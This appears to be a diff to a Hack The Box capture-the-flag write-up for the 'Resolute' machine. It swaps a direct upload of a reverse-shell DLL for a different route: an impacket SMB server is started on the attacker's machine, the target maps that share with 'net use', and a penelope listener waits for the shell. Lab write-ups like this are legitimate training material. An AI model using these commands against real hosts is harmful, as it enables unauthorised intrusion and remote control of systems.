@@ -292,15 +292,18 @@ Saved as: reverse.dll
 Ill generate a payload
 
 ```python
-upload /home/kali/htb/resolute/reverse.dll
-                                        
-Info: Uploading /home/kali/htb/resolute/reverse.dll to C:\Users\ryan\Documents\reverse.dll
-                                        
-Data: 12288 bytes of 12288 bytes copied
-                                        
-Info: Upload successful!
+sudo impacket-smbserver share $(pwd) -smb2support -username hacker -password hackme
+[sudo] password for kali: 
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 ```
-Uploaded it to the target 
+This has started an SMB server on my machine
+
+```python
+*Evil-WinRM* PS C:\Temp> net use Z: \\10.10.14.90\share /user:hacker hackme
+The command completed successfully.
+
+
+```
 
 ```python
 penelope -p 1337                                     
